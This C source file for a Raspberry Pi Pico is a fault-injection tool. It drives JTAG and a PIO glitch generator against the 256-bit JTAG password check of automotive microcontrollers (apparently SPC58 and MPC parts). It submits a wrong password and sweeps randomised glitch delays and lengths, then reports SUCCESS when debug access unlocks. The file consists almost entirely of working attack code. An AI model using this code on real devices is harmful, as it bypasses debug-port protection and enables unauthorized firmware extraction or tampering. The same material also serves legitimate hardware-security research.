#include <stdio.h>
#include <string.h>
#include "pico/stdlib.h"
#include "pico/binary_info.h"
#include "hardware/pio.h"
#include "pico/multicore.h"
#include "pio_jtag.h"
#include <glitch.pio.h>
#include <time.h>
#include "pico/rand.h" 
#include <stdlib.h>

#include "pJTAGConfig.h"



uint8_t correct_password[] = {
                            0xCE,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                            0xCE,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                            0xCE,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                            0xCE,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                        };
uint8_t glitch_password_spc[] = {
                            0x00,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                            0xCE,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                            0xCE,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                            0xCE,0xFA,0xED,0xFE,0xEF,0xBE,0xFE,0xCA,
                        };                      

uint8_t placeholder_password[] = {
                            0x11,0x11,0x11,0x11,0x22,0x22,0x22,0x22,
                            0x33,0x33,0x33,0x33,0x44,0x44,0x44,0x44,
                            0x55,0x55,0x55,0x55,0x66,0x66,0x66,0x66,
                            0x77,0x77,0x77,0x77,0x88,0x88,0x88,0x88,
                        };


uint8_t placeholder_password_mpc[] = {
                            0x00,0x11,0x11,0x11,0x22,0x22,0x22,0x22,
                            0x33,0x33,0x33,0x33,0x44,0x44,0x44,0x44,
                            0x55,0x55,0x55,0x55,0x66,0x66,0x66,0x66,
                            0x77,0x77,0x77,0x77,0x88,0x88,0x88,0x88,
                        };


//lookup table to quickly reverse bytes
unsigned char reverse_byte(unsigned char x)
{
    static const unsigned char table[] = {
        0x00, 0x80, 0x40, 0xc0, 0x20, 0xa0, 0x60, 0xe0,
        0x10, 0x90, 0x50, 0xd0, 0x30, 0xb0, 0x70, 0xf0,
        0x08, 0x88, 0x48, 0xc8, 0x28, 0xa8, 0x68, 0xe8,
        0x18, 0x98, 0x58, 0xd8, 0x38, 0xb8, 0x78, 0xf8,
        0x04, 0x84, 0x44, 0xc4, 0x24, 0xa4, 0x64, 0xe4,
        0x14, 0x94, 0x54, 0xd4, 0x34, 0xb4, 0x74, 0xf4,
        0x0c, 0x8c, 0x4c, 0xcc, 0x2c, 0xac, 0x6c, 0xec,
        0x1c, 0x9c, 0x5c, 0xdc, 0x3c, 0xbc, 0x7c, 0xfc,
        0x02, 0x82, 0x42, 0xc2, 0x22, 0xa2, 0x62, 0xe2,
        0x12, 0x92, 0x52, 0xd2, 0x32, 0xb2, 0x72, 0xf2,
        0x0a, 0x8a, 0x4a, 0xca, 0x2a, 0xaa, 0x6a, 0xea,
        0x1a, 0x9a, 0x5a, 0xda, 0x3a, 0xba, 0x7a, 0xfa,
        0x06, 0x86, 0x46, 0xc6, 0x26, 0xa6, 0x66, 0xe6,
        0x16, 0x96, 0x56, 0xd6, 0x36, 0xb6, 0x76, 0xf6,
        0x0e, 0x8e, 0x4e, 0xce, 0x2e, 0xae, 0x6e, 0xee,
        0x1e, 0x9e, 0x5e, 0xde, 0x3e, 0xbe, 0x7e, 0xfe,
        0x01, 0x81, 0x41, 0xc1, 0x21, 0xa1, 0x61, 0xe1,
        0x11, 0x91, 0x51, 0xd1, 0x31, 0xb1, 0x71, 0xf1,
        0x09, 0x89, 0x49, 0xc9, 0x29, 0xa9, 0x69, 0xe9,
        0x19, 0x99, 0x59, 0xd9, 0x39, 0xb9, 0x79, 0xf9,
        0x05, 0x85, 0x45, 0xc5, 0x25, 0xa5, 0x65, 0xe5,
        0x15, 0x95, 0x55, 0xd5, 0x35, 0xb5, 0x75, 0xf5,
        0x0d, 0x8d, 0x4d, 0xcd, 0x2d, 0xad, 0x6d, 0xed,
        0x1d, 0x9d, 0x5d, 0xdd, 0x3d, 0xbd, 0x7d, 0xfd,
        0x03, 0x83, 0x43, 0xc3, 0x23, 0xa3, 0x63, 0xe3,
        0x13, 0x93, 0x53, 0xd3, 0x33, 0xb3, 0x73, 0xf3,
        0x0b, 0x8b, 0x4b, 0xcb, 0x2b, 0xab, 0x6b, 0xeb,
        0x1b, 0x9b, 0x5b, 0xdb, 0x3b, 0xbb, 0x7b, 0xfb,
        0x07, 0x87, 0x47, 0xc7, 0x27, 0xa7, 0x67, 0xe7,
        0x17, 0x97, 0x57, 0xd7, 0x37, 0xb7, 0x77, 0xf7,
        0x0f, 0x8f, 0x4f, 0xcf, 0x2f, 0xaf, 0x6f, 0xef,
        0x1f, 0x9f, 0x5f, 0xdf, 0x3f, 0xbf, 0x7f, 0xff,
    };
    return table[x];
}


int min_glitch_length = -1;
int max_glitch_length = -1;
int min_glitch_delay = -1;
int max_glitch_delay = -1;
uint8_t received_password[32];
int default_password = -1;
int glitch_delay, glitch_length;


void init_pins()
{
    bi_decl(bi_4pins_with_names(PIN_TCK, "TCK", PIN_TDI, "TDI", PIN_TDO, "TDO", PIN_TMS, "TMS")); // set pins with name
}

pio_jtag_inst_t jtag = {
            .pio = pio0,
            .sm = 0
};



PIO pio = pio1; 
uint sm;

void jtag_task()
{
#ifndef MULTICORE
    
#endif
}


void djtag_init()
{
    init_pins();
    init_jtag(&jtag, 3000, PIN_TCK, PIN_TDI, PIN_TDO, PIN_TMS, PIN_RST, PIN_TRST, PIN_PORST);
}

static uint8_t tx_buf[64];





void write_TDI(pio_jtag_inst_t* jtag, uint8_t* data, uint32_t len, uint8_t* tx_buf){

    //send all bits except 1, because last bit must be send with leaving state
    jtag_transfer(jtag, len-1, data, tx_buf);

    //get last bit of data to send (MSB of last byte)
    unsigned char last_bit = (data[(len-1) >> 3] & (1 << ((len-1) & 0x07)));



    //for sending last bit and read TDO
    if (tx_buf)
    {
         jtag_set_clk(jtag, 0);
         jtag_set_tdi(jtag, last_bit);
         jtag_set_tms(jtag, 1);
         

         jtag_set_clk(jtag, 1);
         jtag_set_tdi(jtag, last_bit);
         jtag_set_tms(jtag, 1);         
         

         unsigned char last_tdo = jtag_get_tdo(jtag);
         tx_buf[(len-1) >> 3] |= (last_tdo << ((8 - (len % 8)) & 7)); // add last bit of TDO at correct position to buffer if not multiple of 8
        
    }else{
        // if TDO is not required just send last bit with TMS 1  
        jtag_strobe(jtag, 1, 1 , last_bit);
    }

}


void reset_to_idle(pio_jtag_inst_t* jtag){
    //move through test logic reset
    jtag_strobe(jtag, 5, 1, 0); // 5 times TMS high always get to Test-Logic-Reset state
    jtag_strobe(jtag, 1, 0, 0); // move to run-test/idle

}


uint32_t get_idcode(pio_jtag_inst_t* jtag){


    //not needed as idcode automatically loaded into register in test logic reset state
    /*
    jtag_strobe(jtag, 1, 0, 0); // move to run-test-idle
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t data[] = {0x01}; //load IDCODE instruction
    write_TDI(jtag, data, 6, NULL); 
    jtag_strobe(jtag, 2, 1, 0); // move to select-dr scan
    */

    jtag_strobe(jtag, 1, 1, 0); // move to select-dr scan
    jtag_strobe(jtag, 2, 0, 0); // move to shift-dr 
    uint8_t idcode[] = {0x00,0x00,0x00,0x00}; //32 bits to read back 32bit IDCODE on TDO
    write_TDI(jtag, idcode, 32, tx_buf);
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    uint32_t id = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8) | (reverse_byte(tx_buf[2]) << 16) | (reverse_byte(tx_buf[3]) << 24);
    //printf("IDCODE: 0x%x\n", id);

    return id;
}




void transfer_password(pio_jtag_inst_t* jtag, uint8_t* password){

    //Select jtag password register
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t data[] = {0x07}; //select JTAG_PASSWORD_REGISTER instruction
    write_TDI(jtag, data, 6, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    


    //send 256 bit password
    jtag_strobe(jtag, 1, 1, 0); // move to select-dr scan
    jtag_strobe(jtag, 2, 0, 0); // move to shift-dr state
    write_TDI(jtag, password, 256, NULL);
    

    // with Update-DR state password will be transfered to parallel hold register; start of glitching
    pio_sm_put_blocking(pio, sm, glitch_delay);
    pio_sm_put_blocking(pio, sm, glitch_length);
    jtag_strobe(jtag, 1, 1, 0); //move to Update-DR

    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    
    
    
    /*
    //select bypass register
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t bypass[] = {0x3F}; // bypass instruction
    write_TDI(jtag, bypass, 6, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state
    
    uint32_t bypass_value = reverse_byte(tx_buf[0]);
    */


    //Access E200 Core 2
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t core[] = {0x2A}; 
    write_TDI(jtag, core, 6, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state
    uint32_t core2_value = reverse_byte(tx_buf[0]);
    

    /*
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t check[] = {0x7E,0x0}; // 
    write_TDI(jtag, check, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    uint32_t first_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);
    */



    /*
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t check2[] = {0x12,0x2}; // 
    write_TDI(jtag, check2, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state
    uint32_t second_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);   
   */


    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t check3[] = {0x12,0x0}; // 
    write_TDI(jtag, check3, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    uint32_t third_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);
   



    jtag_strobe(jtag, 1, 1, 0); // move to select-dr scan
    jtag_strobe(jtag, 2, 0, 0); // move to shift-dr state
    uint8_t dr[] = {0x3,0x0,0x0,0x0};
    write_TDI(jtag, dr, 32, tx_buf);
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state


    uint32_t dr_ret = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8) | (reverse_byte(tx_buf[2]) << 16) | (reverse_byte(tx_buf[3]) << 24);



    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scan
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t last[] = {0x31,0x2}; // 
    write_TDI(jtag, last, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    uint32_t fourth_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);    
    
    //password check finished

    



    //Access E200 Core 0
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t core0[] = {0x21}; 
    write_TDI(jtag, core0, 6, tx_buf); 

    jtag_strobe(jtag, 2, 1, 0);

    //move through PAUSE-DR to transfer control back to JTAGC controller
    jtag_strobe(jtag, 1, 0, 0); //capture-dr
    jtag_strobe(jtag, 1, 1, 0); //exit1-dr
    jtag_strobe(jtag, 1, 0, 0); //pause-dr
    jtag_strobe(jtag, 2, 1, 0); //update-dr
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state




    reset_to_idle(jtag);

   // printf("Results: 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x\n",bypass_value, core2_value, first_val, second_val, third_val, dr_ret, fourth_val);
    printf("Results: 0x%x 0x%x 0x%x 0x%x\n",core2_value, third_val, dr_ret, fourth_val);
     if (fourth_val == 0x209){
        printf("glitch_param: %d %d SUCCESS\n",glitch_delay,glitch_length);
    }
     

    
}

uint8_t *random_bit_flip(uint8_t *password, uint8_t* flipped_password){

    memcpy(flipped_password, password,32);
   
    uint32_t random_byte = get_rand_32() % 32;

    uint8_t byte = flipped_password[random_byte];

    uint32_t random_bit = get_rand_32() % 8;

    byte ^= (1<<random_bit);

    flipped_password[random_byte] = byte;

    return flipped_password;
 
}

void transfer_password_mpc(pio_jtag_inst_t* jtag, uint8_t* password){

    //Select jtag password register
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t data[] = {0x07}; //select JTAG_PASSWORD_REGISTER instruction
    write_TDI(jtag, data, 6, tx_buf); 

    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    


    //send 256 bit password
    jtag_strobe(jtag, 1, 1, 0); // move to select-dr scan
    jtag_strobe(jtag, 2, 0, 0); // move to shift-dr state
    write_TDI(jtag, password, 256, NULL);

    // with Update-DR state password will be transfered to parallel hold register; start of glitching
    pio_sm_put_blocking(pio, sm, glitch_delay);
    pio_sm_put_blocking(pio, sm, glitch_length);
    jtag_strobe(jtag, 1, 1, 0); //move to Update-DR

    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    
    
    //not needed
    /*
    //select bypass register
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t bypass[] = {0x3F}; // bypass instruction
    write_TDI(jtag, bypass, 6, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state
    
    uint32_t bypass_value = reverse_byte(tx_buf[0]);
    */
    
    
    //Access E200 Core 2
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t core[] = {0x29}; 
    write_TDI(jtag, core, 6, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    uint32_t core2_value = reverse_byte(tx_buf[0]);
    


    // not needed because with correct password already enabled?
    /*
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t check[] = {0x7E,0x0}; // 
    write_TDI(jtag, check, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state
    
    uint32_t first_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);
    */


    //not needed as it just reads the OCR
    /*
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t check2[] = {0x12,0x2}; // 
    write_TDI(jtag, check2, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state
    
    uint32_t second_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);   
    */

    
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t check3[] = {0x12,0x0}; // 
    write_TDI(jtag, check3, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state
    
    uint32_t third_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);
   

    jtag_strobe(jtag, 1, 1, 0); // move to select-dr scan
    jtag_strobe(jtag, 2, 0, 0); // move to shift-dr state
    uint8_t dr[] = {0x3,0x0,0x0,0x0};
    write_TDI(jtag, dr, 32, tx_buf);
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    uint32_t dr_ret = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8) | (reverse_byte(tx_buf[2]) << 16) | (reverse_byte(tx_buf[3]) << 24);




    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scan
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t last[] = {0x31,0x2}; // 
    write_TDI(jtag, last, 10, tx_buf); 
    jtag_strobe(jtag, 1, 1, 0);
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    uint32_t fourth_val = reverse_byte(tx_buf[0])| (reverse_byte(tx_buf[1]) << 8);    
    
    //password check finished

    //Access E200 Core 0
    jtag_strobe(jtag, 2, 1, 0); // move to select-IR scann
    jtag_strobe(jtag, 2, 0, 0); // move to shift-IR 
    uint8_t core0[] = {0x28}; 
    write_TDI(jtag, core0, 6, tx_buf); 
    jtag_strobe(jtag, 2, 1, 0);

    //move through PAUSE-DR to transfer control back to JTAGC controller
    jtag_strobe(jtag, 1, 0, 0); //capture-dr
    jtag_strobe(jtag, 1, 1, 0); //exit1-dr
    jtag_strobe(jtag, 1, 0, 0); //pause-dr
    jtag_strobe(jtag, 2, 1, 0); //update-dr
    jtag_strobe(jtag, 1, 0, 0); // move to run test idle state

    reset_to_idle(jtag);
   

     //printf("Results: 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x\n",bypass_value, core2_value, first_val, second_val, third_val, dr_ret, fourth_val);
    printf("Results: 0x%x 0x%x 0x%x 0x%x\n",core2_value, third_val, dr_ret, fourth_val);
     if (fourth_val == 0x209){
        printf("glitch_param: %d %d SUCCESS\n",glitch_delay,glitch_length);
    }
     


}




void reset_board_glitch(pio_jtag_inst_t* jtag){

    //completely reset spc58 by long glitch 
    glitch_delay = 0;
    glitch_length = 63;
    pio_sm_put_blocking(pio, sm, glitch_delay);
    pio_sm_put_blocking(pio, sm, glitch_length);                    
    sleep_ms(15);
}

void reset_mpc(pio_jtag_inst_t* jtag){

    jtag_set_porst(jtag, 0);
    jtag_set_rst(jtag,0);
    jtag_set_trst(jtag,0);
    sleep_ms(15);
    jtag_set_porst(jtag, 1);
    jtag_set_trst(jtag,1);
    jtag_set_rst(jtag,1);

    sleep_ms(40);
}


void parse_range(int* min_val, int* max_val){

    char input[10];
    fgets(input, sizeof(input), stdin);    

    char *start = strtok(input, ",");  
    char *end = strtok(NULL, ",");  

    if(strlen(start) != 0 && strlen(end) != 0){
        *min_val = atoi(start);
        *max_val = atoi(end);
    }
}

int received_password_bytes(uint8_t *array){

    int c = getchar_timeout_us(1000000);

    if (c != 'P')
    {
        return -1;
    }

    for (int i = 0; i < 32; i++) {
        int byte = getchar_timeout_us(1000000);

        array[i] = (uint8_t)byte;
    }

    return 0;
}

void parse_arguments(){

    
    parse_range(&min_glitch_length, &max_glitch_length);

    parse_range(&min_glitch_delay, &max_glitch_delay);
    

    default_password = received_password_bytes(received_password);


    


}


int main()
{
    stdio_init_all();

    
    djtag_init(); 


    
    sm = pio_claim_unused_sm(pio, true);

    uint offset = pio_add_program(pio, &glitch_ctrl_program);

    glitch_ctrl_program_init(pio, sm, offset, 14);

    pio_sm_set_clkdiv_int_frac(pio, sm, 1, 0); 
    pio_sm_set_enabled(pio, sm, true);


    sleep_ms(3000);


    printf("Waiting on arguments...\n");
    parse_arguments();


    long long i = 0;
    while(1){
        reset_to_idle(&jtag);
  
        uint32_t idcode = get_idcode(&jtag);

        
        if(idcode == 0x10142041){
            //44 before reset?
            //glitch_delay = get_rand_32() % 2171;
            //glitch_length = get_rand_32() % (61) + 20;
            //glitch_length = get_rand_32() % (8) + 50;

            //glitch_length = get_rand_32() % (14) + 35;

            //standard parameters if no given
            if (min_glitch_length == -1 && max_glitch_length == -1){
                min_glitch_length = 20;
                max_glitch_length = 48;
            }

            glitch_length = get_rand_32() % (max_glitch_length - min_glitch_length + 1) + min_glitch_length;

            //standard parameters if no given
            if (min_glitch_delay == -1 && max_glitch_delay == -1){
                min_glitch_delay = 0;
                max_glitch_delay = 1500;
            }

            glitch_delay = get_rand_32() % (max_glitch_delay - min_glitch_delay + 1) + min_glitch_delay;


            printf("Try %lld glitch_delay %d, glitch_length %d \n", i, glitch_delay,glitch_length);
            
            uint8_t *pw = glitch_password_spc;

            if(default_password == 0){
                
                pw = received_password;
            }

            transfer_password(&jtag,pw);                      
            reset_board_glitch(&jtag);
           

        
        }else if(idcode == 0x0988201D){
            //standard parameters if no given
            if (min_glitch_length == -1 && max_glitch_length == -1){
                min_glitch_length = 20;
                max_glitch_length = 70;
            }

            glitch_length = get_rand_32() % (max_glitch_length - min_glitch_length + 1) + min_glitch_length;

            //standard parameters if no given
            if (min_glitch_delay == -1 && max_glitch_delay == -1){
                min_glitch_delay = 0;
                max_glitch_delay = 2000;
            }

            glitch_delay = get_rand_32() % (max_glitch_delay - min_glitch_delay + 1) + min_glitch_delay;


            // max for MPC 2650 70?
            //glitch_delay = get_rand_32() % 2650;
            //glitch_length = get_rand_32() % (51) + 20;


            printf("Try %lld glitch_delay %d, glitch_length %d \n", i, glitch_delay,glitch_length);
           

            /*
            uint8_t flipped[32];
            random_bit_flip(placeholder_password,flipped);
            */



            uint8_t *pw = placeholder_password_mpc;

            if(default_password == 0){
                
                pw = received_password;
            }

            transfer_password_mpc(&jtag,pw);

            reset_mpc(&jtag);                
        }else{
            printf("FAIL IDCODE\n");
            reset_board_glitch(&jtag);
            reset_mpc(&jtag);
        }

    

        printf("\n");
        i++;
    }


    return 0;
}
